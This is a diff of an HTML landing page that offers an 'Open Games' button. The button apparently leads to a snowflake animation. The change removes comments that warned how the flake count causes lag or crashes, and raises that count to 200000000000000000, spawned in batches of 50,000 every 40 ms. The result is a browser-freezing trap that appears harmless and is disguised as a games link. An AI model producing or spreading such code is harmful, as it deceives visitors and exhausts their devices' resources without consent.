@@ -4,14 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome</title>
+
     <style>
-        /* Landing Page Styles */
         body, html {
             margin: 0;
             padding: 0;
             height: 100%;
-            font-family: 'Arial', sans-serif;
-            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,158 +20,112 @@
 
         #landing-page {
             text-align: center;
-            z-index: 1000;
             background: white;
             padding: 40px;
             border-radius: 12px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.1);
         }
 
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-        }
-
         #start-btn {
-            background-color: #007bff;
+            background: #007bff;
             color: white;
             border: none;
             padding: 15px 30px;
             font-size: 1.2rem;
             border-radius: 8px;
             cursor: pointer;
-            transition: transform 0.2s, background-color 0.2s;
         }
 
-        #start-btn:hover {
-            background-color: #0056b3;
-            transform: scale(1.05);
-        }
-
-        /* The Snowflake Container */
         #snowflake-container {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000;
+            inset: 0;
+            background: black;
             overflow: hidden;
-            z-index: 9999;
-            pointer-events: none; /* Allows clicking through if needed, though it will be laggy */
         }
 
         .snowflake {
             position: absolute;
             top: -20px;
-            color: #fff;
-            font-size: 1.5em;
+            color: white;
             user-select: none;
-            will-change: transform;
         }
     </style>
 </head>
+
 <body>
 
-    <!-- Landing Page -->
-    <div id="landing-page">
-        <h2>Welcome to LLA</h2>
-        <button id="start-btn">Open G*mes</button>
-    </div>
+<div id="landing-page">
+    <h2>Welcome to LLA</h2>
+    <button id="start-btn">Open Games</button>
+</div>
 
-    <!-- Snowflake Container -->
-    <div id="snowflake-container"></div>
+<div id="snowflake-container"></div>
 
-    <script>
-        const startBtn = document.getElementById('start-btn');
-        const landingPage = document.getElementById('landing-page');
-        const container = document.getElementById('snowflake-container');
-        
-        // ---------------------------------------------------------
-        // CONFIGURATION: CHANGE THIS NUMBER TO ADJUST LAG
-        // 2000 = Smooth
-        // 10000 = Laggy
-        // 50000 = Heavy Lag / Browser Freeze
-        // 100000+ = Likely Crash
-        // ---------------------------------------------------------
-        const SNOWFLAKE_COUNT = 50; 
-        
-        let animationFrameId;
+<script>
+const startBtn = document.getElementById('start-btn');
+const landingPage = document.getElementById('landing-page');
+const container = document.getElementById('snowflake-container');
 
-        function startSnowstorm() {
-            // Hide landing page
-            landingPage.style.display = 'none';
-            container.style.display = 'block';
-            document.body.style.overflow = 'hidden';
+const SNOWFLAKE_COUNT = 200000000000000000;
 
-            console.log(`Generating ${SNOWFLAKE_COUNT} snowflakes... This may freeze your browser.`);
+let created = 0;
 
-            // Create elements in batches to prevent immediate total lockup
-            // We use a DocumentFragment for better performance during insertion
-            const fragment = document.createDocumentFragment();
-            const snowflakes = [];
+function createFlake() {
+    const el = document.createElement('div');
+    el.className = 'snowflake';
+    el.textContent = '❄';
 
-            for (let i = 0; i < SNOWFLAKE_COUNT; i++) {
-                const el = document.createElement('div');
-                el.classList.add('snowflake');
-                el.textContent = '❄';
-                
-                // Randomize initial position and size
-                const x = Math.random() * window.innerWidth;
-                const y = Math.random() * window.innerHeight;
-                const size = Math.random() * 2 + 0.5; // 0.5em to 2.5em
-                const speed = Math.random() * 2 + 0.5;
-                const drift = (Math.random() - 0.5) * 2;
+    const x = Math.random() * window.innerWidth;
+    const y = Math.random() * window.innerHeight;
 
-                el.style.left = `${x}px`;
-                el.style.top = `${y}px`;
-                el.style.fontSize = `${size}em`;
-                
-                // Store physics data directly on the element to avoid a separate array lookup
-                el.dataset.speed = speed;
-                el.dataset.drift = drift;
-                el.dataset.y = y;
+    el.style.left = x + 'px';
+    el.style.top = y + 'px';
 
-                fragment.appendChild(el);
-            }
+    el.dataset.y = y;
+    el.dataset.speed = 1 + Math.random() * 2;
 
-            container.appendChild(fragment);
-            console.log("Snowflakes added. Starting animation loop...");
+    container.appendChild(el);
+}
 
-            // Animation Loop
-            function animate() {
-                const flakes = container.children;
-                const height = window.innerHeight;
-                const width = window.innerWidth;
+function spawn() {
+    for (let i = 0; i < 50000 && created < SNOWFLAKE_COUNT; i++) {
+        createFlake();
+        created++;
+    }
+    if (created < SNOWFLAKE_COUNT) {
+        setTimeout(spawn, 40);
+    }
+}
 
-                for (let i = 0; i < flakes.length; i++) {
-                    const flake = flakes[i];
-                    let y = parseFloat(flake.dataset.y);
-                    let drift = parseFloat(flake.dataset.drift);
-                    let speed = parseFloat(flake.dataset.speed);
+function animate() {
+    const flakes = container.children;
+    const h = window.innerHeight;
 
-                    // Update position
-                    y += speed;
-                    drift += Math.sin(y * 0.05) * 0.5; // Wiggle effect
+    for (let i = 0; i < flakes.length; i++) {
+        const f = flakes[i];
+        let y = parseFloat(f.dataset.y);
+        let speed = parseFloat(f.dataset.speed);
 
-                    // Reset if out of bounds
-                    if (y > height) {
-                        y = -20;
-                        drift = (Math.random() - 0.5) * 2;
-                    }
+        y += speed;
 
-                    flake.style.transform = `translate(${drift}px, ${y - parseFloat(flake.style.top)}px)`;
-                    flake.dataset.y = y;
-                }
+        if (y > h) y = -20;
 
-                animationFrameId = requestAnimationFrame(animate);
-            }
+        f.dataset.y = y;
+        f.style.transform = `translateY(${y}px)`;
+    }
 
-            animate();
-        }
+    requestAnimationFrame(animate);
+}
 
-        startBtn.addEventListener('click', startSnowstorm);
-    </script>
+startBtn.onclick = () => {
+    landingPage.style.display = 'none';
+    container.style.display = 'block';
+
+    spawn();
+    animate();
+};
+</script>
+
 </body>
 </html>
